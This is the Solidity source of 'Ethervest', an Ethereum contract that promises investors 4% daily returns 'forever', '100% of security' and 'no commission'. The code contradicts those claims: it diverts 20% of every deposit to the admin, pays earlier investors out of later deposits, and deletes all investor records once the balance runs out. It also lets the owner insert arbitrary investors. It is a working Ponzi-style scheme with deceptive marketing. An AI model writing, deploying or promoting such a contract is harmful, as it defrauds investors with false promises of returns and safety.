['pragma solidity ^0.4.24;\n', '\n', '/**\n', ' *\n', ' * Ethervest Investment Contract\n', ' *  - GAIN 4% DAILY AND FOREVER (every 5900 blocks)\n', ' *  – MIN INVESTMENT 0.01 ETH\n', ' *  – 100% OF SECURITY\n', " *  - NO COMMISSION on your investment (every ether stays on contract's balance)\n", ' *\n', ' *\n', ' * RECOMMENDED GAS LIMIT: 250000\n', ' * RECOMMENDED GAS PRICE: https://ethgasstation.info/\n', ' *\n', ' *\n', ' */\n', '\n', 'contract Ethervest {\n', '    address public owner;\n', '    address public adminAddr;\n', '    uint constant public MASS_TRANSACTION_LIMIT = 150;\n', '    uint constant public MINIMUM_INVEST = 10000000000000000 wei;\n', '    uint constant public INTEREST = 4;\n', '    uint public depositAmount;\n', '    uint public round;\n', '    uint public lastPaymentDate;\n', '    EthervestKiller public ethervestKiller;\n', '    address[] public addresses;\n', '    mapping(address => Investor) public investors;\n', '    bool public pause;\n', '\n', '    struct Investor\n', '    {\n', '        uint id;\n', '        uint deposit;\n', '        uint deposits;\n', '        uint date;\n', '        address referrer;\n', '    }\n', '\n', '    struct EthervestKiller\n', '    {\n', '        address addr;\n', '        uint deposit;\n', '    }\n', '\n', '    event Invest(address addr, uint amount, address referrer);\n', '    event Payout(address addr, uint amount, string eventType, address from);\n', '    event NextRoundStarted(uint round, uint date, uint deposit);\n', '    event EthervestKillerChanged(address addr, uint deposit);\n', '\n', '    modifier onlyOwner {if (msg.sender == owner) _;}\n', '\n', '    constructor() public {\n', '        owner = msg.sender;\n', '        adminAddr = msg.sender;\n', '        addresses.length = 1;\n', '        round = 1;\n', '    }\n', '\n', '    function transferOwnership(address addr) onlyOwner public {\n', '        owner = addr;\n', '    }\n', '\n', '    function addInvestors(address[] _addr, uint[] _deposit, uint[] _date, address[] _referrer) onlyOwner public {\n', '        // add initiated investors\n', '        for (uint i = 0; i < _addr.length; i++) {\n', '            uint id = addresses.length;\n', '            if (investors[_addr[i]].deposit == 0) {\n', '                addresses.push(_addr[i]);\n', '                depositAmount += _deposit[i];\n', '            }\n', '\n', '            investors[_addr[i]] = Investor(id, _deposit[i], 1, _date[i], _referrer[i]);\n', '            emit Invest(_addr[i], _deposit  [i], _referrer[i]);\n', '\n', '            if (investors[_addr[i]].deposit > ethervestKiller.deposit) {\n', '                ethervestKiller = EthervestKiller(_addr[i], investors[_addr[i]].deposit);\n', '            }\n', '        }\n', '        lastPaymentDate = now;\n', '    }\n', '\n', '    function() payable public {\n', '        if (owner == msg.sender) {\n', '            return;\n', '        }\n', '\n', '        if (0 == msg.value) {\n', '            payoutSelf();\n', '            return;\n', '        }\n', '\n', '        require(false == pause, "Ethervest is restarting. Please wait.");\n', '        require(msg.value >= MINIMUM_INVEST, "Too small amount, minimum 0.01 ether");\n', '        Investor storage user = investors[msg.sender];\n', '\n', '        if (user.id == 0) {\n', '            // ensure that payment not from hacker contract\n', '            msg.sender.transfer(0 wei);\n', '            addresses.push(msg.sender);\n', '            user.id = addresses.length;\n', '            user.date = now;\n', '\n', '            // referrer\n', '            address referrer = bytesToAddress(msg.data);\n', '            if (investors[referrer].deposit > 0 && referrer != msg.sender) {\n', '                user.referrer = referrer;\n', '            }\n', '        } else {\n', '            payoutSelf();\n', '        }\n', '\n', '        // save investor\n', '        user.deposit += msg.value;\n', '        user.deposits += 1;\n', '\n', '        emit Invest(msg.sender, msg.value, user.referrer);\n', '\n', '        depositAmount += msg.value;\n', '        lastPaymentDate = now;\n', '\n', '        adminAddr.transfer(msg.value / 5); // project fee\n', '        uint bonusAmount = (msg.value / 100) * INTEREST; // referrer commission for all deposits\n', '\n', '        if (user.referrer > 0x0) {\n', '            if (user.referrer.send(bonusAmount)) {\n', '                emit Payout(user.referrer, bonusAmount, "referral", msg.sender);\n', '            }\n', '\n', '            if (user.deposits == 1) { // cashback only for the first deposit\n', '                if (msg.sender.send(bonusAmount)) {\n', '                    emit Payout(msg.sender, bonusAmount, "cash-back", 0);\n', '                }\n', '            }\n', '        } else if (ethervestKiller.addr > 0x0) {\n', '            if (ethervestKiller.addr.send(bonusAmount)) {\n', '                emit Payout(ethervestKiller.addr, bonusAmount, "killer", msg.sender);\n', '            }\n', '        }\n', '\n', '        if (user.deposit > ethervestKiller.deposit) {\n', '            ethervestKiller = EthervestKiller(msg.sender, user.deposit);\n', '            emit EthervestKillerChanged(msg.sender, user.deposit);\n', '        }\n', '    }\n', '\n', '    function payout(uint offset) public\n', '    {\n', '        if (pause == true) {\n', '            doRestart();\n', '            return;\n', '        }\n', '\n', '        uint txs;\n', '        uint amount;\n', '\n', '        for (uint idx = addresses.length - offset - 1; idx >= 1 && txs < MASS_TRANSACTION_LIMIT; idx--) {\n', '            address addr = addresses[idx];\n', '            if (investors[addr].date + 20 hours > now) {\n', '                continue;\n', '            }\n', '\n', '            amount = getInvestorDividendsAmount(addr);\n', '            investors[addr].date = now;\n', '\n', '            if (address(this).balance < amount) {\n', '                pause = true;\n', '                return;\n', '            }\n', '\n', '            if (addr.send(amount)) {\n', '                emit Payout(addr, amount, "bulk-payout", 0);\n', '            }\n', '\n', '            txs++;\n', '        }\n', '    }\n', '\n', '    function payoutSelf() private {\n', '        require(investors[msg.sender].id > 0, "Investor not found.");\n', '        uint amount = getInvestorDividendsAmount(msg.sender);\n', '\n', '        investors[msg.sender].date = now;\n', '        if (address(this).balance < amount) {\n', '            pause = true;\n', '            return;\n', '        }\n', '\n', '        msg.sender.transfer(amount);\n', '        emit Payout(msg.sender, amount, "self-payout", 0);\n', '    }\n', '\n', '    function doRestart() private {\n', '        uint txs;\n', '        address addr;\n', '\n', '        for (uint i = addresses.length - 1; i > 0; i--) {\n', '            addr = addresses[i];\n', '            addresses.length -= 1;\n', '            delete investors[addr];\n', '            if (txs++ == MASS_TRANSACTION_LIMIT) {\n', '                return;\n', '            }\n', '        }\n', '\n', '        emit NextRoundStarted(round, now, depositAmount);\n', '        pause = false;\n', '        round += 1;\n', '        depositAmount = 0;\n', '        lastPaymentDate = now;\n', '\n', '        delete ethervestKiller;\n', '    }\n', '\n', '    function getInvestorCount() public view returns (uint) {\n', '        return addresses.length - 1;\n', '    }\n', '\n', '    function getInvestorDividendsAmount(address addr) public view returns (uint) {\n', '        return investors[addr].deposit / 100 * INTEREST * (now - investors[addr].date) / 1 days;\n', '    }\n', '\n', '    function bytesToAddress(bytes bys) private pure returns (address addr) {\n', '        assembly {\n', '            addr := mload(add(bys, 20))\n', '        }\n', '    }\n', '}']